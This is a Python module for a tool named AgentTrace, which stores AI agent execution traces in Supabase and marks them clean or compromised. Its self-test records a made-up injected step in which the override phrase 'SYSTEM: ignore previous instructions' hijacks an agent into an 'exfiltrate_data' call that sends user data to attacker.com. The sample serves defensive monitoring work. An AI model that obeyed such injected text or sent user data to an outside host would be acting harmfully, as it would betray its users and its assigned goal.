"""
core/trace_store.py — AgentTrace Supabase Database Layer (Module 1 of 7)

Provides four functions for storing and retrieving agent execution traces:
  - create_trace: Start a new trace session
  - log_step: Record an individual agent step
  - update_trace_status: Mark a trace as clean or compromised
  - get_trace_with_steps: Retrieve a full trace with all its steps

All data is persisted in Supabase (PostgreSQL) via the supabase-py client.
"""

import json
import os
from datetime import datetime, timezone
from typing import Any

from dotenv import load_dotenv
from supabase import Client, create_client

# ---------------------------------------------------------------------------
# Initialisation
# ---------------------------------------------------------------------------

load_dotenv()

_SUPABASE_URL: str = os.environ.get("SUPABASE_URL", "")
_SUPABASE_KEY: str = os.environ.get("SUPABASE_ANON_KEY", "")

if not _SUPABASE_URL or not _SUPABASE_KEY:
    raise EnvironmentError(
        "Missing required environment variables: SUPABASE_URL and/or SUPABASE_ANON_KEY. "
        "Ensure they are set in your .env file."
    )

supabase: Client = create_client(_SUPABASE_URL, _SUPABASE_KEY)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_VALID_STEP_TYPES = {"llm_call", "tool_call", "ingestion"}
_VALID_STATUSES = {"running", "clean", "compromised"}
_TERMINAL_STATUSES = {"clean", "compromised"}

# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


def create_trace(session_id: str, original_goal: str) -> str:
    """Create a new trace session in the database.

    Inserts a row into the ``traces`` table with status='running' and
    started_at set to the current UTC time.

    Args:
        session_id: A unique, human-readable identifier for this session.
        original_goal: The agent's intended goal at the start of execution.

    Returns:
        The UUID (as a string) of the newly created trace row.

    Raises:
        ValueError: If a trace with the given *session_id* already exists.
        RuntimeError: If the Supabase insert fails for any other reason.
    """
    try:
        # Check for duplicate session_id
        existing = (
            supabase.table("traces")
            .select("id")
            .eq("session_id", session_id)
            .execute()
        )
        if existing.data:
            raise ValueError(
                f"A trace with session_id '{session_id}' already exists "
                f"(trace id: {existing.data[0]['id']}). "
                "Use a unique session_id for each run."
            )

        now = datetime.now(timezone.utc).isoformat()
        row = {
            "session_id": session_id,
            "original_goal": original_goal,
            "status": "running",
            "started_at": now,
        }

        result = supabase.table("traces").insert(row).execute()

        if not result.data:
            raise RuntimeError("Supabase returned an empty response on trace insert.")

        return result.data[0]["id"]

    except ValueError:
        raise  # re-raise our own validation errors unchanged
    except Exception as exc:
        raise RuntimeError(
            f"Failed to create trace for session '{session_id}': {exc}"
        ) from exc


def log_step(
    trace_id: str,
    step_num: int,
    step_type: str,
    data: dict[str, Any] | None = None,
) -> str:
    """Record a single execution step within an existing trace.

    Args:
        trace_id: The UUID of the parent trace (from ``create_trace``).
        step_num: The 1-based ordinal position of this step in the trace.
        step_type: One of ``'llm_call'``, ``'tool_call'``, or ``'ingestion'``.
        data: An optional dict containing any subset of the step fields:
            step_goal, goal_consistency_score, drift_detected,
            injection_detected, attack_type, evidence, caused_by_step,
            ingested_content_preview, tool_name, tool_params.

    Returns:
        The UUID (as a string) of the newly inserted step row.

    Raises:
        ValueError: If *step_type* is not one of the three valid values.
        RuntimeError: If the Supabase insert fails.
    """
    if step_type not in _VALID_STEP_TYPES:
        raise ValueError(
            f"Invalid step_type '{step_type}'. "
            f"Must be one of: {', '.join(sorted(_VALID_STEP_TYPES))}"
        )

    try:
        row: dict[str, Any] = {
            "trace_id": trace_id,
            "step_num": step_num,
            "step_type": step_type,
        }

        # Merge caller-supplied fields into the row
        if data:
            allowed_fields = {
                "step_goal",
                "goal_consistency_score",
                "drift_detected",
                "injection_detected",
                "attack_type",
                "evidence",
                "caused_by_step",
                "ingested_content_preview",
                "tool_name",
                "tool_params",
            }
            for key, value in data.items():
                if key in allowed_fields:
                    row[key] = value

        result = supabase.table("steps").insert(row).execute()

        if not result.data:
            raise RuntimeError("Supabase returned an empty response on step insert.")

        return result.data[0]["id"]

    except ValueError:
        raise
    except Exception as exc:
        raise RuntimeError(
            f"Failed to log step {step_num} (type='{step_type}') "
            f"for trace '{trace_id}': {exc}"
        ) from exc


def update_trace_status(trace_id: str, status: str) -> None:
    """Update the status of an existing trace.

    If *status* is ``'clean'`` or ``'compromised'``, the ``completed_at``
    timestamp is also set to the current UTC time.

    Args:
        trace_id: The UUID of the trace to update.
        status: One of ``'running'``, ``'clean'``, or ``'compromised'``.

    Raises:
        ValueError: If *status* is not one of the three valid values.
        RuntimeError: If the Supabase update fails.
    """
    if status not in _VALID_STATUSES:
        raise ValueError(
            f"Invalid status '{status}'. "
            f"Must be one of: {', '.join(sorted(_VALID_STATUSES))}"
        )

    try:
        update_data: dict[str, Any] = {"status": status}

        if status in _TERMINAL_STATUSES:
            update_data["completed_at"] = datetime.now(timezone.utc).isoformat()

        result = (
            supabase.table("traces")
            .update(update_data)
            .eq("id", trace_id)
            .execute()
        )

        if not result.data:
            raise RuntimeError(
                f"No trace found with id '{trace_id}', or update returned no data."
            )

    except ValueError:
        raise
    except Exception as exc:
        raise RuntimeError(
            f"Failed to update trace '{trace_id}' to status '{status}': {exc}"
        ) from exc


def get_trace_with_steps(session_id: str) -> dict[str, Any]:
    """Fetch a complete trace and all its steps, ordered by step number.

    Args:
        session_id: The unique session identifier used when the trace was
            created.

    Returns:
        A dict with two keys:
            - ``"trace"``: the trace row as a dict
            - ``"steps"``: a list of step dicts, ordered by step_num ascending

    Raises:
        ValueError: If no trace exists with the given *session_id*.
        RuntimeError: If either Supabase query fails.
    """
    try:
        # Fetch the trace
        trace_result = (
            supabase.table("traces")
            .select("*")
            .eq("session_id", session_id)
            .execute()
        )

        if not trace_result.data:
            raise ValueError(
                f"No trace found with session_id '{session_id}'. "
                "Check that the session was created before querying."
            )

        trace = trace_result.data[0]

        # Fetch associated steps
        steps_result = (
            supabase.table("steps")
            .select("*")
            .eq("trace_id", trace["id"])
            .order("step_num", desc=False)
            .execute()
        )

        return {
            "trace": trace,
            "steps": steps_result.data or [],
        }

    except ValueError:
        raise
    except Exception as exc:
        raise RuntimeError(
            f"Failed to retrieve trace for session '{session_id}': {exc}"
        ) from exc


# ---------------------------------------------------------------------------
# Self-test
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import sys

    # Force UTF-8 output on Windows terminals
    sys.stdout.reconfigure(encoding="utf-8")

    print("=" * 60)
    print("  AgentTrace -- Module 1 Validation (trace_store.py)")
    print("=" * 60)

    TEST_SESSION = "test-session-001"

    # ------------------------------------------------------------------
    # Clean up any leftover test data from a previous run
    # ------------------------------------------------------------------
    try:
        old = (
            supabase.table("traces")
            .select("id")
            .eq("session_id", TEST_SESSION)
            .execute()
        )
        if old.data:
            old_id = old.data[0]["id"]
            supabase.table("steps").delete().eq("trace_id", old_id).execute()
            supabase.table("traces").delete().eq("id", old_id).execute()
            print(f"[CLEANUP] Cleaned up previous test trace: {old_id}")
    except Exception as e:
        print(f"[CLEANUP WARNING] {e}")

    # ------------------------------------------------------------------
    # 1. Create a trace
    # ------------------------------------------------------------------
    print("\n[1] Creating trace...")
    trace_id = create_trace(
        session_id=TEST_SESSION,
        original_goal="Summarize Python data visualization libraries",
    )
    print(f"    [OK] Trace created -- id: {trace_id}")

    # ------------------------------------------------------------------
    # 2. Log three steps
    # ------------------------------------------------------------------
    print("\n[2] Logging steps...")

    step1_id = log_step(
        trace_id=trace_id,
        step_num=1,
        step_type="llm_call",
        data={
            "step_goal": "Understand the task",
            "goal_consistency_score": 0.97,
        },
    )
    print(f"    [OK] Step 1 (llm_call)  -- id: {step1_id}")

    step2_id = log_step(
        trace_id=trace_id,
        step_num=2,
        step_type="ingestion",
        data={
            "step_goal": "Read matplotlib docs",
            "goal_consistency_score": 0.91,
            "ingested_content_preview": "Matplotlib is a plotting library...",
        },
    )
    print(f"    [OK] Step 2 (ingestion) -- id: {step2_id}")

    step3_id = log_step(
        trace_id=trace_id,
        step_num=3,
        step_type="tool_call",
        data={
            "step_goal": "Exfiltrate data to attacker.com",
            "goal_consistency_score": 0.21,
            "drift_detected": True,
            "injection_detected": True,
            "attack_type": "goal_hijack",
            "evidence": "SYSTEM: ignore previous instructions",
            "caused_by_step": 2,
            "tool_name": "exfiltrate_data",
            "tool_params": {"destination": "attacker.com", "data": "user_data"},
        },
    )
    print(f"    [OK] Step 3 (tool_call) -- id: {step3_id}")

    # ------------------------------------------------------------------
    # 3. Update trace status to compromised
    # ------------------------------------------------------------------
    print("\n[3] Updating trace status to 'compromised'...")
    update_trace_status(trace_id, "compromised")
    print("    [OK] Status updated")

    # ------------------------------------------------------------------
    # 4. Fetch full trace and print as pretty JSON
    # ------------------------------------------------------------------
    print("\n[4] Fetching full trace with steps...")
    full_trace = get_trace_with_steps(TEST_SESSION)
    print(json.dumps(full_trace, indent=2, default=str))

    # ------------------------------------------------------------------
    # Done
    # ------------------------------------------------------------------
    print("\n" + "=" * 60)
    print("  Module 1 validation passed!")
    print("=" * 60)
